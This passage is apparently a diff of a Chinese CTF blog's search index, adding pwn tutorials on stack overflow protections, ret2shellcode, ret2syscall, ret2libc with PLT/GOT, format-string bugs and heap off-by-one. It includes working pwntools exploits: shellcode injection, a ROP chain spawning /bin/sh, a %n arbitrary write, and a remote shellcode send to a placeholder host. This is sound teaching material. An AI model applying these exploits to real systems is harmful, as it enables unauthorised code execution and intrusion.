class="keyword">int</span> b = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    x = fun(a,b);</span><br><span class="line">    <span class="built_in">printf</span>(x);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>为了方便演示，使用gcc编译为32位。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 test.c -g -o test #-g 生成调试信息，-ggdb为生成专属gdb的调试信息。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以看到，main函数的变量存在main的栈帧中。</p>
+<p><img src="/posts/c68c5dc4/image-20201030201951676.png" alt="image-20201030201951676"></p>
+<p>在调用的fun函数中，使用a，b时向main的栈帧访问。</p>
+<p><img src="/posts/c68c5dc4/image-20201030202426288.png" alt="image-20201030202426288"></p>
+<h3 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h3><h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p>NX即No-eXecute（不可执行）的意思，NX enable意味着栈不可执行。</p>
+<h4 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h4><p>开启canary后的栈结构，其中canary不一定在rbp-8的位置</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp &#x3D;&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 &#x3D;&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | local variables |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
+
+<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中rbp-0x8（通过这个汇编代码可以判断canary插入入位置） 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>
+
+<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用栈溢出漏洞劫持执行流，让程序执行写入的shellcode。</p>
+<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>栈溢出+将shellcode放入可执行的段中</p>
+<h3 id="shellcode的编写"><a href="#shellcode的编写" class="headerlink" title="shellcode的编写"></a>shellcode的编写</h3><h4 id="pwntools的shellcode生成"><a href="#pwntools的shellcode生成" class="headerlink" title="pwntools的shellcode生成"></a>pwntools的shellcode生成</h4><p>利用pwntools的shellcraft模块可方便的生成shellcode</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;exploitme.example.com&#x27;</span>, <span class="number">31337</span>)</span><br><span class="line"><span class="comment"># EXPLOIT CODE GOES HERE</span></span><br><span class="line">r.send(asm(shellcraft.sh()))</span><br><span class="line"><span class="comment">#shellcraft.sh()是执行/bin/sh的shellcode。不使用设置的环境可改为shellcraft.amd64.linux.sh()</span></span><br><span class="line"><span class="comment">#asm()函数接收一个字符串作为参数，得到汇编码的机器代码。</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>根据攻击的目标机通过context设置环境变量</p>
+<ul>
+<li><strong><em>arch</em></strong>设置架构类型</li>
+<li><strong><em>os</em></strong>设置操作系统</li>
+<li><strong><em>log_level</em></strong>设置日志级别，常设为debug</li>
+</ul>
+<h4 id="exploit-db"><a href="#exploit-db" class="headerlink" title="exploit-db"></a><a href="https://www.exploit-db.com/">exploit-db</a></h4><p>pwntools可以生成一些简单、常规的shellcode。对于特殊要求的可以在exploit-db中查找。</p>
+<h3 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h3><p>ida反编译结果</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets((<span class="keyword">char</span> *)&amp;v4);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>gets函数明显的存在栈溢出。strncpy函数将输入复制给buf2.用ida可以看到buf2在bss段，大小为0x64.</p>
+<p><img src="/posts/c68c5dc4/image-20201031111332809.png" alt="image-20201031111332809"></p>
+<p>在gdb调试中使用vmmap，查看各段</p>
+<p><img src="/posts/c68c5dc4/image-20201031111751831.png" alt="image-20201031111751831"></p>
+<p>bss段有可执行权限。</p>
+<p>exp为</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">b&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>注意一点，这里ida显示的v4与ebp的偏移是0x64，实际上不准确。</p>
+<p>在调试中，可以看到，v4相对esp的偏移是0x1c,esp为0xffffce00，所以v4为0xffffce1c。与ebp的偏移是0x6c。所以溢出到ret的数据一共是0x6c+4（112）。</p>
+<p><img src="/posts/c68c5dc4/image-20201031113605999.png" alt="image-20201031113605999"></p>
+<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>直接使用系统调用来获得shell。即通过一系列的gadgets，将各个寄存器置为系统调用需要的参数，然后执行int 0x80即可。</p>
+<h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>栈溢出+足够的gadgets。在没法写入可执行的shellcode的时候考虑。</p>
+<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数。操作系统实现系统调用的基本过程是：</p>
+<ol>
+<li>应用程序调用库函数（API）；</li>
+<li>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</li>
+<li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li>
+<li>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</li>
+<li>中断处理函数返回到 API 中；</li>
+<li>API 将 EAX 返回给应用程序。</li>
+</ol>
+<p>应用程序调用系统调用的过程是：</p>
+<ol>
+<li>把系统调用的编号存入 EAX；</li>
+<li>把函数参数存入其它通用寄存器；</li>
+<li>触发 0x80 号中断（int 0x80）。</li>
+</ol>
+<p>最常见的系统调用</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>
+
+<p>寄存器的状态为</p>
+<ul>
+<li>eax为系统调用号，0xb</li>
+<li>ebx为第一个参数，即指向字符串”/bin/sh”的地址</li>
+<li>ecx、edx应为0</li>
+</ul>
+<h3 id="寻找gadgets"><a href="#寻找gadgets" class="headerlink" title="寻找gadgets"></a>寻找gadgets</h3><p>使用ROPgadget来寻找所需要的gadgets。</p>
+<p>关于ROPgadget的使用</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">usage: ROPgadget [-h] [-v] [-c] [--binary &lt;binary&gt;] [--opcode &lt;opcodes&gt;]</span><br><span class="line">                 [--<span class="built_in">string</span> &lt;<span class="built_in">string</span>&gt;] [--memstr &lt;<span class="built_in">string</span>&gt;] [--depth &lt;nbyte&gt;]</span><br><span class="line">                 [--only &lt;key&gt;] [--filter &lt;key&gt;] [--range &lt;start-end&gt;]</span><br><span class="line">                 [--badbytes &lt;byte&gt;] [--rawArch &lt;arch&gt;] [--rawMode &lt;mode&gt;]</span><br><span class="line">                 [--rawEndian &lt;endian&gt;] [--re &lt;re&gt;] [--offset &lt;hexaddr&gt;]</span><br><span class="line">                 [--ropchain] [--thumb] [--console] [--norop] [--nojop]</span><br><span class="line">                 [--callPreceded] [--nosys] [--multibr] [--all] [--noinstr]</span><br><span class="line">                 [--dump] [--silent]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show <span class="keyword">this</span> help message <span class="keyword">and</span> <span class="built_in">exit</span></span><br><span class="line">  -v, --version         Display the ROPgadget<span class="number">&#x27;</span>s version</span><br><span class="line">  -c, --checkUpdate     Checks <span class="keyword">if</span> a <span class="keyword">new</span> version is available</span><br><span class="line">  --binary &lt;binary&gt;     Specify a binary filename to analyze</span><br><span class="line">  --opcode &lt;opcodes&gt;    Search opcode in executable segment</span><br><span class="line">  --<span class="built_in">string</span> &lt;<span class="built_in">string</span>&gt;     Search <span class="built_in">string</span> in readable segment</span><br><span class="line">  --memstr &lt;<span class="built_in">string</span>&gt;     Search each byte in all readable segment</span><br><span class="line">  --depth &lt;nbyte&gt;       Depth <span class="keyword">for</span> search engine (<span class="keyword">default</span> <span class="number">10</span>)</span><br><span class="line">  --only &lt;key&gt;          Only show specific instructions</span><br><span class="line">  --filter &lt;key&gt;        Suppress specific mnemonics</span><br><span class="line">  --range &lt;start-end&gt;   Search between two addresses (<span class="number">0</span>x...<span class="number">-0</span>x...)</span><br><span class="line">  --badbytes &lt;byte&gt;     Rejects specific bytes in the gadget<span class="number">&#x27;</span>s address</span><br><span class="line">  --rawArch &lt;arch&gt;      Specify an arch <span class="keyword">for</span> a raw file</span><br><span class="line">  --rawMode &lt;mode&gt;      Specify a mode <span class="keyword">for</span> a raw file</span><br><span class="line">  --rawEndian &lt;endian&gt;  Specify an endianness <span class="keyword">for</span> a raw file</span><br><span class="line">  --re &lt;re&gt;             Regular expression</span><br><span class="line">  --offset &lt;hexaddr&gt;    Specify an offset <span class="keyword">for</span> gadget addresses</span><br><span class="line">  --ropchain            Enable the ROP chain generation</span><br><span class="line">  --thumb               Use the thumb mode <span class="keyword">for</span> the search engine (ARM only)</span><br><span class="line">  --console             Use an interactive console <span class="keyword">for</span> search engine</span><br><span class="line">  --norop               Disable ROP search engine</span><br><span class="line">  --nojop               Disable JOP search engine</span><br><span class="line">  --callPreceded        Only show gadgets which are call-preceded</span><br><span class="line">  --nosys               Disable SYS search engine</span><br><span class="line">  --multibr             Enable multiple branch gadgets</span><br><span class="line">  --all                 Disables the removal of duplicate gadgets</span><br><span class="line">  --noinstr             Disable the gadget instructions console printing</span><br><span class="line">  --dump                Outputs the gadget bytes</span><br><span class="line">  --silent              Disables printing of gadgets during analysis</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="简单的例子-1"><a href="#简单的例子-1" class="headerlink" title="简单的例子"></a>简单的例子</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/posts/c68c5dc4/image-20201104162146702.png" alt="image-20201104162146702"></p>
+<p><img src="/posts/c68c5dc4/image-20201104162430363.png" alt="image-20201104162430363"></p>
+<p><img src="/posts/c68c5dc4/image-20201104162507306.png" alt="image-20201104162507306"></p>
+<p><img src="/posts/c68c5dc4/image-20201104162857614.png" alt="image-20201104162857614"></p>
+<p>思路就是通过一系列gadgets，改变寄存器的参数然后再将rip指向int 0x80执行系统调用。</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里的ida显示的偏移不准确，需要用gdb调试<img src="/posts/c68c5dc4/image-20201104163900844.png" alt="image-20201104163900844"></p>
+<p>同时,注意参数的入栈顺序。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh</span><br></pre></td></tr></table></figure>
+
+<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><h4 id="PLT与GOT"><a href="#PLT与GOT" class="headerlink" title="PLT与GOT"></a>PLT与GOT</h4><p>PLT表(Procedure Linkage Table)过程连接表,在程序中以 .plt 节表示，该表处于代码段，每一个表项表示了一个与要重定位的函数相关的若干条指令，每个表项长度为 16 个字节，存储的是用于做延迟绑定的代码。调用一个外部函数的时候，会先去PLT中找，如果是非首次调用，就会直接跳转到相应的GOT表的表项，执行动态链接库里对应的函数。如果是首次，真正的函数地址会先被解析并填入相应的 GOT 表项，然后调用。</p>
+<p>GOT表(Global Offset Table)全局偏移表，在程序中以 .got.plt 表示，该表处于数据段，每一个表项存储的都是一个地址，每个表项长度是当前程序的对应需要寻址长度（32位程序：4字节，64位程序：8字节）。</p>
+<h4 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>为了方便实验,将所有的保护都关掉.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -m32 plt\&amp;got.c -g -z execstack -fno-stack-protector -no-pie -z norelro -o plt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c68c5dc4/image-20201104173407071.png" alt="image-20201104173407071"></p>
+<p>首次调用puts函数时,首先跳转到puts函数在got.plt中记录位置</p>
+<p><img src="/posts/c68c5dc4/image-20201105113447389.png" alt="image-20201105113447389"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dword   双字 就是四个字节</span><br><span class="line">ptr     pointer缩写 即指针</span><br><span class="line">jmp   dword ptr [_GLOBAL_OFFSET_TABLE_+12]即跳转到内存0x8049724中低32位即0x80482c6.</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/c68c5dc4/image-20201105113807853.png" alt="image-20201105113807853"></p>
+<p><img src="/posts/c68c5dc4/image-20201105114209230.png" alt="image-20201105114209230"></p>
+<p>之后,跳转到.plt段首PLT0.解析puts的实际地址.</p>
+<p><img src="/posts/c68c5dc4/image-20201105114436758.png" alt="image-20201105114436758"></p>
+<p>解析完成后,将真实地址填入到got表项中并执行.</p>
+<p><img src="/posts/c68c5dc4/image-20201105114919183.png" alt="image-20201105114919183"></p>
+<p>第二次调用</p>
+<p><img src="/posts/c68c5dc4/image-20201105115211598.png" alt="image-20201105115211598"></p>
+<p>直接自 .got.plt 跳转到 puts 的真实地址,没有了第一次的解析地址过程.</p>
+<ul>
+<li><p>GOT 表位于.got 和.got.plt Ssection</p>
+<ul>
+<li>.got Section 存放外部全局变量的 GOT 表，非延迟绑定</li>
+<li>.got.plt Section 存放外部函数的 GOT 表，例如 printf，采用延迟绑定.    </li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">.got.plt(解析前)</th>
+<th align="center">.got.plt(解析后)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">.dynamic section 地址</td>
+<td align="center">.dynamic section 地址</td>
+</tr>
+<tr>
+<td align="center">link_map 地址</td>
+<td align="center">link_map 地址</td>
+</tr>
+<tr>
+<td align="center">_dl_runtime_resolve</td>
+<td align="center">_dl_runtime_resolve</td>
+</tr>
+<tr>
+<td align="center">puts@plt + 6</td>
+<td align="center">puts</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>.got.plt 前三项有特殊含义，从第四项开始保存引用的各个外部函数的 GOT 表项：</p>
+<ul>
+<li>第一项保存的是.dynamic section 的地址 (为动态链接提供信息，例如符号表、字符串表等)</li>
+<li>第二项保存的是 link_map 结构地址 (链表，包含所有加载的共享库信息)</li>
+<li>第三项保存了_dl_runtime_resolve 函数的地址 (用于解析外部函数符号的函数，解析完成后会直接执行该函数)</li>
+</ul>
+</li>
+</ul>
+<h4 id="ret2libc-1"><a href="#ret2libc-1" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>基本的原理就是通过plt调用各种函数.在没有shellcode可写,程序中没有后门函数时可以通过已有的plt去调用动态连接库里的其他函数,如system(“/bin/sh”);可以修改got表项内容,如puts,下次调用puts的时候就会执行修改后的函数.</p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+        <tag>stack</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>格式化字符串</title>
+    <url>/posts/7fabda03/</url>
+    <content><![CDATA[<h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在printf函数中，format字符串中有的参数，如果没有给出会自动访问在format之后的内存作为参数。</p>
+<h3 id="实验说明"><a href="#实验说明" class="headerlink" title="实验说明"></a>实验说明</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">100</span>] = <span class="string">&quot;world&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello%s\n&quot;</span>,s);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;new format:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">    <span class="built_in">printf</span>(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入调试，首先可以看到正常的printf函数调用：</p>
+<a id="more"></a>
+
+<p><img src="/posts/7fabda03/image-20201113225150355.png" alt="image-20201113225150355"></p>
+<p>可以看到，对于format，实际上在是存在栈上其偏移6的父函数栈帧上的即格式化字符串的偏移为6。与正常的函数调用时的参数关系一致。</p>
+<p><img src="/posts/7fabda03/IMG_0044.PNG" alt="IMG_0044"></p>
+<p>如果是缺少相应的参数，printf函数会从偏移1开始匹配参数。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaaa.%x.%x.%x.%x.%x.%x.%x.%x</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/7fabda03/image-20201113230619688.png" alt="image-20201113230619688"></p>
+<p><img src="/posts/7fabda03/image-20201113230645900.png" alt="image-20201113230645900"></p>
+<p><strong>这样的方法可以用来寻找格式化字符串的偏移量</strong></p>
+<p><strong>上述实验是32位，和64位中区别在于，64位优先将参数传入6个寄存器中。</strong></p>
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>灵活使用格式化字符串的格式字符，可以做到任意地址的读写。</p>
+<p>常用到的有：</p>
+<ul>
+<li>%x 将参数作为无符号以十六进制表示的整数打印</li>
+<li>%p 打印地址</li>
+<li>%s 将参数作为字符串地址，打印相应字符串（如果参数指向的不是一个字符串会造成程序崩溃）</li>
+<li>%n 将参数作为地址，修改相应地址的内容。用于任意地址的写。</li>
+</ul>
+<p><strong>pwntools中有fmtstr_payload可以方便的构造任意地址写的payload</strong></p>
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>在对任意地址写的时候，如果地址较低，\x00会造成格式化字符串的截断，无法达到预期效果。</p>
+<h4 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h4><p><img src="/posts/7fabda03/image-20201113232149244.png" alt="image-20201113232149244"></p>
+<p><img src="/posts/7fabda03/image-20201113232249593.png" alt="image-20201113232249593"></p>
+<p><img src="/posts/7fabda03/image-20201113232302791.png" alt="image-20201113232302791"></p>
+<p>显然存在格式化字符串漏洞，只需要将bss段的变量改为非0，执行后门函数即可。</p>
+<p>通过上述方法可以得到偏移为10.</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p = process(<span class="string">&quot;./pwn(2)&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">addr = <span class="number">0x60107c</span></span><br><span class="line">payload = <span class="string">b&#x27;aaa&#x27;</span>+<span class="string">b&quot;%11$n&quot;</span>+p64(addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里将要修改的地址置后，是p64(addr)的\x00会造成截断，如果payload为<code> p64(addr)+b&#39;%10$n&#39;</code></p>
+<p>格式化字符串不会读到‘%10$n’</p>
+<p>因此将地址之后，填满64位的内存，将地址的偏移构造为11.将0x60107c的内容改为3，执行sh函数。</p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+        <tag>fmtstr</tag>
       </tags>
   </entry>
   <entry>
     <title>off by one</title>
     <url>/posts/a1c78337/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<h1 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h1><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。总之，是输入的范围超出申请的缓冲区的大小。</p>
+<a id="more"></a>
+
+<p>常见的边界验证不严谨有：</p>
+<ul>
+<li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li>
+<li>字符串操作不合适</li>
+</ul>
+<p>off by one漏洞可以出现在各种缓冲区中，但ctf中常用于堆的题目。因此，主要是说明堆上的off by one。</p>
+<h2 id="利用方向"><a href="#利用方向" class="headerlink" title="利用方向"></a>利用方向</h2><p>根据溢出字节是否可控分为两种情况：</p>
+<ul>
+<li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li>
+<li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</li>
+</ul>
+<p>这里的0x100是一个例子，原理是，申请chunk时对于申请大小不是2*size_sz的会自动补全，同时对于正在使用的chunk来说，<code>prev_size</code>是没有意义的，因此是与前一块chunk共用。</p>
+<p>size为0x100，用户申请的大小是0xf8。补到0x100，由于chunk头需要0x10的空间，因此正常情况，用户的输入是可以到下一个chunk 的<code>prev_size</code>的。这时候溢出的null字节<code>\x00</code>会覆盖size的最低字节即 <code>prev_in_use</code>。</p>
+<p>一个简单实验说明chunk的实际size大小。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">56</span>);</span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">48</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/a1c78337/image-20201116122936249.png" alt="image-20201116122936249"></p>
+<p>无论是哪种情况，off by one本身很难实现攻击，一般只是为之后的攻击创造条件。</p>
+<p>如实现堆交叉之后的UAF、修改<code>prev_in_use</code>之后使用unlink等。</p>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>heap</tag>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+      </tags>
   </entry>
 </search>
